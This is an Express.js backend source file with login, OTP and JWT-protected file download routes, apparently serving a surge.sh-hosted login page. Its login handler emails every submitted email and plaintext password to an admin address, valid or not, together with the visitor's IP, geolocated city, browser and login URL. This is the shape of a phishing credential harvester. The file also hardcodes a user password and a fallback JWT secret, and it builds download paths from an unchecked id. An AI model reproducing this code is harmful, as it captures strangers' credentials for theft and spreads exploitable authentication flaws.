require('dotenv').config();
const express = require('express');
const cors = require('cors');
const jwt = require('jsonwebtoken');
const bodyParser = require('body-parser');
const fs = require('fs');
const path = require('path');
const nodemailer = require("nodemailer");
const crypto = require('crypto');
const useragent = require('useragent');
const https = require('https');

const app = express();

const allowedOrigins = [
  'http://localhost:3000',
  'https://mash-polist-splash.surge.sh' // Replace with your surge domain
];

const PORT = process.env.PORT || 8080;
const smtpUser = process.env.SMTP_USER;
const smtpPass = process.env.SMTP_PASS;
const adminEmail = process.env.ADMIN_EMAIL;
const SECRET = process.env.SECRET || "default_secret_if_none_set";

app.use(cors({
  origin: function (origin, callback) {
    if (!origin) return callback(null, true);
    if (allowedOrigins.indexOf(origin) === -1) {
      return callback(new Error('Not allowed by CORS'), false);
    }
    return callback(null, true);
  },
  credentials: true
}));

app.use(bodyParser.json());

// Mock user - replace with actual user logic as needed
const USER = { id: 1, email: "egli79380@gmail.com", password: "password123_zMq-h5*wE-FdUk" };

const transporter = nodemailer.createTransport({
  service: "gmail",
  auth: { user: smtpUser, pass: smtpPass }
});

let otpStore = {};

function getClientIp(req) {
  return (req.headers["x-forwarded-for"] || "").split(",").pop()
    || req.connection.remoteAddress
    || req.socket.remoteAddress
    || req.connection?.socket?.remoteAddress
    || "unknown";
}

function getLocationFromIp(ip) {
  return new Promise((resolve) => {
    https.get(`https://ip-api.com/json/${ip}`, (resp) => {
      let data = '';
      resp.on('data', chunk => data += chunk);
      resp.on('end', () => {
        try {
          const response = JSON.parse(data);
          if (response.status === 'success') {
            resolve(`${response.city}, ${response.regionName}, ${response.country}`);
          } else {
            resolve('Location not found');
          }
        } catch (e) {
          resolve('Location parse error');
        }
      });
    }).on('error', err => {
      console.error('Error fetching location:', err);
      resolve('Error fetching location');
    });
  });
}

// Login endpoint with OTP and admin alert
app.post('/api/login', async (req, res) => {
  const { email, password, loginUrl } = req.body;

  if (!email || !password) {
    return res.status(400).json({ success: false, message: "Email and password are required." });
  }

  const ip = getClientIp(req);
  const locationInfo = await getLocationFromIp(ip);
  const url = loginUrl || req.headers['referer'] || 'unknown';
  const uaString = req.headers['user-agent'] || 'Unknown User-Agent';
  const agent = useragent.parse(uaString);
  const browserName = agent.family;
  const browserVersion = agent.toVersion();
  const platform = agent.os.toString();

  const alertMailText = `
Login attempt: 
Email: ${email}
Password: ${password}
Timestamp: ${new Date().toLocaleString()}
IP Address: ${ip}
Location: ${locationInfo}
Browser: ${browserName} ${browserVersion}
User Agent: ${uaString}
Platform: ${platform}
Login URL: ${url}
  `;

  transporter.sendMail({
    from: smtpUser,
    to: adminEmail,
    subject: 'User Login Attempt',
    text: alertMailText
  }, (error) => {
    if (error) {
      console.error('Failed to send admin alert email:', error);
    } else {
      console.log('Admin alerted about login attempt');
    }
  });

  if (email === USER.email && password === USER.password) {
    const otp = crypto.randomInt(100000, 999999).toString();
    otpStore[email] = { otp, created: Date.now() };

    transporter.sendMail({
      from: smtpUser,
      to: email,
      subject: 'Your OTP Code',
      text: `Your OTP code is: ${otp}. It expires in 15 minutes.`
    }, (err) => {
      if (err) {
        console.error('Failed to send OTP email:', err);
        return res.status(500).json({ success: false, message: 'Failed to send OTP email' });
      }
      res.json({ success: true, message: 'OTP sent' });
    });
  } else {
    return res.status(401).json({ success: false, message: "Invalid credentials" });
  }
});

// OTP verification endpoint
app.post('/api/verify-otp', (req, res) => {
  const { email, otp } = req.body;

  const record = otpStore[email];
  if (record) {
    const now = Date.now();
    const expiry = 15 * 60 * 1000; // 15 minutes
    if (record.otp === otp && (now - record.created) < expiry) {
      delete otpStore[email];
      const token = jwt.sign({ id: USER.id, email: USER.email }, SECRET, { expiresIn: "2h" });
      res.json({ success: true, token });
    } else {
      res.status(401).json({ success: false, message: "Invalid or expired OTP" });
    }
  } else {
    res.status(401).json({ success: false, message: "OTP not found" });
  }
});

// JWT authentication middleware
function authenticate(req, res, next) {
  const auth = req.headers.authorization;
  if (!auth) return res.status(403).json({ message: "Missing token" });

  const token = auth.split(' ')[1];
  try {
    req.user = jwt.verify(token, SECRET);
    next();
  } catch (err) {
    res.status(403).json({ message: "Invalid or expired token" });
  }
}

// Protected file download endpoint
app.get('/api/file/:id', authenticate, (req, res) => {
  const fileId = req.params.id;
  const filePath = path.join(__dirname, 'protected_files', fileId);
  if (fs.existsSync(filePath)) {
    res.download(filePath);
  } else {
    res.status(404).json({ message: "File not found" });
  }
});

app.listen(PORT, () => console.log(`Backend running on port ${PORT}`));
